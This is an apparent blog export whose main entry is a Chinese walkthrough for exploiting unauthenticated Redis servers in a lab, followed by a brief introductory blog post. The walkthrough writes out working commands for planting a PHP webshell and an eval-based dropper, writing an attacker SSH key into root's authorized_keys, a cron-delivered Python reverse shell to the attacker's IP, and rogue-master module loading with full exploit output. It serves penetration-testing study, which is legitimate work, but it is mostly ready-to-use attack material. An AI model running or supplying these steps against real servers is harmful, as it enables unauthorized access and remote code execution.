    <link href="/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="一、简介和危害"><a href="#一、简介和危害" class="headerlink" title="一、简介和危害"></a>一、简介和危害</h2><h3 id="1-什么是redis未授权访问漏洞"><a href="#1-什么是redis未授权访问漏洞" class="headerlink" title="1. 什么是redis未授权访问漏洞"></a>1. 什么是redis未授权访问漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>漏洞产生的条件：</p><ol><li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</li><li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li></ol><h3 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2 漏洞危害"></a>2 漏洞危害</h3><ol><li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据； </li><li>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件； </li><li>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</li></ol><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><ul><li>漏洞环境<ul><li>靶机ip：192.168.0.110</li><li>攻击机ip：192.168.0.111</li></ul></li></ul><p>使用命令启动redis服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-server /etc/redis-conf<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis1.png"></p><p>启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.0.110<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis2.png"><br /> </p><h3 id="3-基础命令"><a href="#3-基础命令" class="headerlink" title="3. 基础命令"></a>3. 基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#连接redis</span><br><br>redis-cli -h ip -p 6379 -a passwd<br><br><span class="hljs-comment">#查看redis版本信息等</span><br><br>info<br><br><span class="hljs-comment">#列出当前数据库中所有的键</span><br><br>keys *<br><br><span class="hljs-comment"># 删除所有数据(谨慎使用)</span><br><br>flushall<br><br><span class="hljs-comment"># 设置主从关系</span><br><br>slaveof ip port<br><br><span class="hljs-comment">#设置一个键的值</span><br><br>SET key value<br><br><span class="hljs-comment">#获取一个建的值</span><br><br>GET key <br></code></pre></td></tr></table></figure><h3 id="4-未授权访问复现"><a href="#4-未授权访问复现" class="headerlink" title="4. 未授权访问复现"></a>4. 未授权访问复现</h3><p>使用redis客户端直接无账号成功登录redis：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis3.png"><br />从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p><h4 id="4-1-利用redis写webshell"><a href="#4-1-利用redis写webshell" class="headerlink" title="4.1 利用redis写webshell"></a>4.1 利用redis写webshell</h4><p><strong>利用前提</strong>：</p><ol><li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</li><li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</li></ol><p>这里由于本地搭建，我们已经知道目录，我们把shell写入&#x2F;home&#x2F;ali目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /home/ali<br>config <span class="hljs-built_in">set</span> dbfilename redis.php<br><span class="hljs-built_in">set</span> wenshell <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis4.png"></p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis5.png"></p><p>因为直接这样写会乱码。所以改良一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br></code></pre></td></tr></table></figure><p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。<br />shell写入完成，在靶机上来证明：<br />写入webshell<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis6.png"><br />查看shell.php<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis7.png"><br />当数据库过大时，redis写shell的小技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>set_time_limit(0);<br><span class="hljs-variable">$fp</span>=fopen(<span class="hljs-string">&#x27;mocha.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<br>fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[\&quot;mocha\&quot;]);?&gt;&#x27;</span>);<br><span class="hljs-built_in">exit</span>();<br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="4-2-利用“公私钥”认证获取root权限"><a href="#4-2-利用“公私钥”认证获取root权限" class="headerlink" title="4.2 利用“公私钥”认证获取root权限"></a>4.2 利用“公私钥”认证获取root权限</h4><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。<br />靶机中开启redis服务：redis-server &#x2F;etc&#x2F;redis.conf<br />在靶机中执行  mkdir &#x2F;root&#x2F;.ssh  命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）<br />在攻击机中生成ssh公钥和私钥，密码设置为空：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis8.png"><br />进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> id_rsa.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; 1.txt<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/9.png"><br />链接靶机上的redis服务，<br />将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 1.txt | redis-cli -h 192.168.0.110 -x <span class="hljs-built_in">set</span> crack<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/10.png"></p><p><br />远程登录靶机的redis服务：redis-cli -h 192.168.0.104 <br />并使用 CONFIG GET dir 命令得到redis备份的路径：<br />更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh)<br />设置上传公钥的备份文件名字为authorized_keys：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">config get <span class="hljs-built_in">dir</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh<br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/11.png"></p><p><br />检查是否更改成功（查看有没有authorized_keys文件)，没有问题就保存然后退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">config get dbfilename<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/12.png"><br />至此成功写入ssh公钥到靶机<br />在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#48;&#x2e;&#49;&#49;&#48;">&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#48;&#x2e;&#49;&#49;&#48;</a><br />成功登录<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/13.png"></p><h4 id="4-3-利用Crontab反弹shell"><a href="#4-3-利用Crontab反弹shell" class="headerlink" title="4.3 利用Crontab反弹shell"></a>4.3 利用Crontab反弹shell</h4><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p><p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 7777<br></code></pre></td></tr></table></figure><ul><li>攻击步骤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.0.110<br><br><span class="hljs-built_in">set</span> xxx  <span class="hljs-string">&quot;\n* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.0.111\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span><br><br><br><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron<br><br>config <span class="hljs-built_in">set</span> dbfilename root<br><br>save<br></code></pre></td></tr></table></figure><p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/14.png"><br /> <br />登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/15.png"></p><p>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，<br />因为自己如果不使用redis写任务计划文件，而是正常向&#x2F;etc&#x2F;cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。</p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/16.png"></p><ul><li><strong>解决办法（未完待续）</strong></li></ul><p>发现ubantu下默认使用&#x2F;bin&#x2F;dash执行脚本的问题，解决方式:将shell环境修改为bash。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/17.png"></p><h4 id="4-4-通过主从复制-GetShell"><a href="#4-4-通过主从复制-GetShell" class="headerlink" title="4.4 通过主从复制 GetShell"></a>4.4 通过主从复制 GetShell</h4><h5 id="4-4-1-redis主从复制"><a href="#4-4-1-redis主从复制" class="headerlink" title="4.4.1 redis主从复制"></a>4.4.1 redis主从复制</h5><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>这里我们开两台docker来做测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">1</span>-<span class="hljs-number">7</span>-ubuntu:~/lorexxar$ sudo docker ps<br><span class="hljs-attribute">CONTAINER</span> ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-attribute">3fdb2479af9c</span>        redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>           <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">22</span> hours ago        Up <span class="hljs-number">4</span> seconds        <span class="hljs-number">0.0.0.0:6380</span>-&gt;<span class="hljs-number">6379</span>/tcp   epic_khorana<br><span class="hljs-attribute">3e313c7498c2</span>        redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>           <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">23</span> hours ago        Up <span class="hljs-number">23</span> hours         <span class="hljs-number">0.0.0.0:6379</span>-&gt;<span class="hljs-number">6379</span>/tcp   vibrant_hodgkin<br></code></pre></td></tr></table></figure><p>然后通过slaveof可以设置主从状态</p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/18.png"><br />这样一来数据就会自动同步了</p><h5 id="4-4-2-redis模块"><a href="#4-4-2-redis模块" class="headerlink" title="4.4.2 redis模块"></a>4.4.2 redis模块</h5><p>在了解了主从同步之后，我们还需要对redis的模块有所了解。<br />在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。<br />编写恶意so文件的代码<br /><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><h5 id="4-4-3-利用原理"><a href="#4-4-3-利用原理" class="headerlink" title="4.4.3 利用原理"></a>4.4.3 利用原理</h5><p>Pavel Toporkov在2018年的zeronights会议上，分享了关于这个漏洞的详细原理。<br /><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/19.png"></p><h5 id="4-4-4-复现过程"><a href="#4-4-4-复现过程" class="headerlink" title="4.4.4 复现过程"></a>4.4.4 复现过程</h5><p>选择使用模拟的恶意服务端来作为主机，并模拟fullresync请求。</p><ul><li>第一个脚本</li></ul><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br />然后直接通过脚本来攻击服务端</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">──(root💀kali)-[~/mytools/new/redis-rogue-getshell]<br>└─# ./redis-master.py -r 192.168.0.110 -p 6379 -L 192.168.0.111 -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$7\r<span class="hljs-symbol">\n</span>SLAVEOF\r<span class="hljs-symbol">\n</span>$13\r<span class="hljs-symbol">\n</span>192.168.0.111\r<span class="hljs-symbol">\n</span>$4\r<span class="hljs-symbol">\n</span>8888\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*4\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>CONFIG\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>SET\r<span class="hljs-symbol">\n</span>$10\r<span class="hljs-symbol">\n</span>dbfilename\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>exp.so\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;PING\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;REPLCONF listening-port 6379\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;REPLCONF capa eof capa psync2\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;PSYNC af12f81deb86c2f8397ae9077ea01eea50e506c1 1\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>MODULE\r<span class="hljs-symbol">\n</span>$4\r<span class="hljs-symbol">\n</span>LOAD\r<span class="hljs-symbol">\n</span>$8\r<span class="hljs-symbol">\n</span>./exp.so\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$7\r<span class="hljs-symbol">\n</span>SLAVEOF\r<span class="hljs-symbol">\n</span>$2\r<span class="hljs-symbol">\n</span>NO\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>ONE\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*4\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>CONFIG\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>SET\r<span class="hljs-symbol">\n</span>$10\r<span class="hljs-symbol">\n</span>dbfilename\r<span class="hljs-symbol">\n</span>$8\r<span class="hljs-symbol">\n</span>dump.rdb\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*2\r<span class="hljs-symbol">\n</span>$11\r<span class="hljs-symbol">\n</span>system.exec\r<span class="hljs-symbol">\n</span>$2\r<span class="hljs-symbol">\n</span>id\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;$49\r<span class="hljs-symbol">\n</span>euid=999(redis) gid=999(redis) groups=999(redis)<span class="hljs-symbol">\n</span>\r<span class="hljs-symbol">\n</span>&#x27;<br>euid=999(redis) gid=999(redis) groups=999(redis)<br><br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>MODULE\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>UNLOAD\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>system\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br></code></pre></td></tr></table></figure><ul><li>第二个脚本</li></ul><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/20.png"></p><h2 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h2><p><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/">https://lorexxar.cn/2019/07/10/redis-5-x-rce/</a><br /><a href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">https://github.com/vulhub/vulhub/tree/master/redis/4-unacc</a><br /><a href="https://www.cnblogs.com/websec80/articles/14734623.html">https://www.cnblogs.com/websec80/articles/14734623.html</a><br /><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a><br /><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><a href="https://blog.xray.cool/post/learning-redis-security">https://blog.xray.cool/post/learning-redis-security</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开端</title>
    <link href="/2023/04/20/%E5%BC%80%E7%AB%AF/"/>
    <url>/2023/04/20/%E5%BC%80%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello-blog"><a href="#Hello-blog" class="headerlink" title="Hello blog"></a>Hello blog</h1><p>很早之前就想搭建一个博客，写一点东西，后续博客更新内容如下：</p><ul><li>网络安全</li><li>渗透测试</li><li>甲方安全</li><li>代码</li><li>杂谈</li><li>日常生活</li></ul><p>后续随缘更新…..</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
